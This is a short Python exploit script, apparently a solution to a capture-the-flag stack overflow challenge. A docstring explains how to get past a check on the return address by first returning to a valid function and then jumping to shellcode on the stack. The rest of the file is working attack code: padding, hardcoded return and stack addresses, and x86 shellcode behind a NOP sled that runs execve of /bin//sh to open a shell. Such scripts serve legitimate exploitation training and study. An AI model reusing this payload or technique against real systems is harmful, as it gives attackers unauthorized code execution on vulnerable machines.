#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

'''
Explanation:
The vulnerable function manually checks that the return address does not point to a stack address.
A possible solution is to:
    Overwrite the first return pointer to another valid function - i.e. `main`
    Overwrite the next return pointer to point to our shellcode in the stack
'''


#shellcode = b'\x90\x90\x90\x90\x99\x6a\x0b\x58\x60\x59\xcd\x80\x90\x31\xc0\x40\xcd\x80'
shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode_pointer = struct.pack('I', 0xbffffce4)
ret = struct.pack('I', 0x080484f9)

buf = create_pattern(0x14)
buf += ret
buf += shellcode_pointer
buf += shellcode
buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
